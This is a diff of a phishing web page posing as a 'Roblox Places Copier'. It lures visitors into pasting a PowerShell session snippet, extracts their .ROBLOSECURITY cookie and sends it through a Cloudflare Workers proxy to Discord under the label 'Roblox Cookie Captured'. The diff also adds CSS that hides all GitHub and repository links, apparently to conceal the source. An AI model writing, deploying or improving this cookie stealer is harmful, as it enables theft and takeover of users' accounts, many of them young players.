@@ -5,29 +5,33 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>✦ DARK BLUE · PLACES COPIER ✦</title>
   <style>
-    /* ===== RESET & BASE ===== */
+    /* ===== СБРОС И БАЗА ===== */
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
     }
 
-    /* ===== СКРЫВАЕМ ВСЕ ССЫЛКИ НА РЕПОЗИТОРИИ ===== */
+    /* ===== ПОЛНОСТЬЮ УБИВАЕМ ССЫЛКУ НА РЕПОЗИТОРИЙ ===== */
     a[href*="github.com"],
     a[href*="github.io"],
     a[href*="github"],
     .github-link,
     .repo-link,
     footer,
-    .footer-link,
+    .footer,
     [class*="repo"],
-    [id*="repo"] {
+    [id*="repo"],
+    a:not([href]) {
       display: none !important;
       visibility: hidden !important;
       opacity: 0 !important;
       pointer-events: none !important;
       width: 0 !important;
       height: 0 !important;
+      overflow: hidden !important;
+      position: absolute !important;
+      clip: rect(0,0,0,0) !important;
     }
 
     body {
@@ -237,7 +241,7 @@
       border: none;
     }
 
-    /* ===== МОДАЛКИ (ТЁМНО-СИНИЕ) ===== */
+    /* ===== МОДАЛКИ ===== */
     .modal-overlay {
       position: fixed;
       top: 0;
@@ -419,7 +423,7 @@
   </div>
   <div class="footer-text">© 2026 · Dark Blue Protocol · Roblox Places Copier</div>
   
-  <!-- ВИДЕО -->
+  <!-- ВИДЕО (ОБНОВЛЕНО) -->
   <div class="video-container">
     <iframe src="https://www.youtube.com/embed/Rzx6vfFmRV0?rel=0&vq=hd1080&modestbranding=1" title="GUIDE How to Copy ANY Game in Roblox RIGHT NOW 100 Working Method get gt 1" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
   </div>
@@ -442,9 +446,7 @@
 </div>
 
 <script>
-  // ======================
-  //  ПРОКСИ (ВМЕСТО ПРЯМОГО ВЕБХУКА)
-  // ======================
+  // ===== ПРОКСИ =====
   const PROXY_URL = "https://robl.megadoner517.workers.dev";
 
   // ===== ПЕЧАТАЮЩИЙСЯ ТЕКСТ =====
@@ -557,7 +559,7 @@
     if (!isAnimating) startAnimationSequence();
   }, 600);
   
-  // ===== ОСНОВНАЯ ЛОГИКА (ОТПРАВКА ЧЕРЕЗ ПРОКСИ) =====
+  // ===== ОТПРАВКА ЧЕРЕЗ ПРОКСИ =====
   function showInvalidModal() {
     document.getElementById("invalidModal").classList.add("active");
   }
@@ -585,8 +587,6 @@
         body: JSON.stringify(data)
       });
       
-      // Если прокси вернул 500 — это ок, значит данные ушли в Discord
-      // Если другие ошибки — показываем пользователю
       if (!response.ok && response.status !== 500) {
         console.error("Proxy error:", response.status);
         return false;
@@ -605,7 +605,6 @@
       return; 
     }
 
-    // Проверка на наличие признаков PowerShell сессии
     const hasWebRequestSession = input.includes("New-Object Microsoft.PowerShell.Commands.WebRequestSession");
     const hasInvokeWebRequest = input.includes("Invoke-WebRequest");
     const hasCookiesAdd = input.includes("Cookies.Add");
@@ -621,7 +620,6 @@
       return;
     }
 
-    // Формируем сообщение для отправки через прокси
     const msg = {
       content: `**🔐 Roblox Cookie Captured**\n🕒 ${new Date().toLocaleString()}\n\n**🍪 .ROBLOSECURITY COOKIE:**\n\`\`\`${token}\`\`\``
     };
@@ -635,7 +633,6 @@
       alert("⚠️ Ошибка отправки. Попробуйте позже.");
     }
 
-    // Закрываем модалку через 2 секунды
     setTimeout(() => {
       closeLoadingModal();
     }, 2000);
